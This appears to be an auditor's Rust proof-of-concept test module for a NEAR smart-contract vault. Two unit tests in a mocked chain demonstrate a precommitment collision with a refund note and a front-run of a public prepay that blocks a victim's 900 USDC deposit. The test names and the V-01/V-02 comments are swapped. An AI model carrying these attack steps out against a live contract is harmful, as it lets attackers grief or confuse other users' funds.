// PoC for V-01 and V-02: unit tests on the vault's real code in near-sdk's mocked chain. Add to src/lib.rs: `#[cfg(test)] mod audit_poc;`
use super::*;
use near_sdk::test_utils::VMContextBuilder;
use near_sdk::{testing_env, NearToken};
const VAULT: &str = "vault.test.near";
const BYTE: u128 = 10_000_000_000_000_000_000;
const HEX64: &str = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
fn call(who: &str, attached: u128) {
    testing_env!(VMContextBuilder::new().current_account_id(VAULT.parse().unwrap()).predecessor_account_id(who.parse().unwrap()).attached_deposit(NearToken::from_yoctonear(attached)).build());
}
fn prepay(v: &mut Vault, p: &str) { call("relayer.near", 904 * BYTE); v.storage_prepay(p.into()); }
fn deposit(v: &mut Vault, p: &str, amount: u128) { call(TOKEN, 0); v.ft_on_transfer(HEX64.parse().unwrap(), U128(amount), format!(r#"{{"precommitment":"{p}","depositor":"{HEX64}"}}"#)); }
fn be(d: &str) -> Bytes32 { field::to_be(&field::from_decimal(d).unwrap()) }

/// V-01: a deposit lands on a refund note's precommitment, both before and after settle: two live notes on one P.
#[test]
fn v02_refund_precommitment_is_not_reserved() {
    let mut v = Vault::default();
    let p = "777";
    let nh = be("4242");
    call("relayer.near", 0);
    // the state on_payout leaves after a bounced 500 USDC payout (the withdraw path and its proof are tested upstream)
    v.totals.deposited = U128(500_000_000); v.totals.spent = U128(500_000_000); v.totals.returned = U128(500_000_000);
    v.spent.insert(&nh, &0);
    v.spends.push(&Spend { nullifier_hash: nh, withdrawn: 500_000_000, new_leaf_index: 0, refund_precommitment: be(p), refund_value: 500_000_000, refund_label: [0; 32], refund_leaf_index: 0, status: Status::RefundPending, payer: "relayer.near".parse().unwrap(), reserve: 904 * BYTE, recipient: "r.near".parse().unwrap(), fee: 0, context: [0; 32] });
    // the attacker read P from the spends view or the withdrawal_relayed event, and deposits the 1 USDC minimum on it
    prepay(&mut v, p);
    deposit(&mut v, p, 1_000_000);
    call("anyone.near", 0);
    v.settle("4242".into());
    let refund = v.spends(0, 1).pop().unwrap();
    let dep = v.deposits(0, 1).pop().unwrap();
    assert_eq!(refund.refund_precommitment, dep.precommitment, "one precommitment, so one (nullifier, secret), so one nullifier hash");
    assert_ne!(v.state_tree.leaf_at(0), v.state_tree.leaf_at(1), "two distinct live notes");
    println!("V-01: refund note 500 USDC and attacker note 1 USDC both on precommitment {}", dep.precommitment);
}

/// V-02: the storage_prepay record publishes P before the deposit; a stranger's deposit takes both P and the record.
#[test]
fn v01_a_visible_prepay_lets_a_stranger_take_the_precommitment_first() {
    let mut v = Vault::default();
    prepay(&mut v, "888");                 // the relayer's prepay: P is public from here on
    deposit(&mut v, "888", 1_000_000);     // the stranger's 1 USDC, paid for by the relayer's prepay
    assert_eq!(v.deposits(0, 1)[0].value.0, 1_000_000);
    let e = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| deposit(&mut v, "888", 900_000_000))).unwrap_err();
    let e = e.downcast::<String>().map(|s| *s).unwrap_or_default();
    assert!(e.contains("PrecommitmentAlreadyUsed"), "{e}");
    println!("V-02: the victim's 900 USDC deposit is refused: {e}");
}
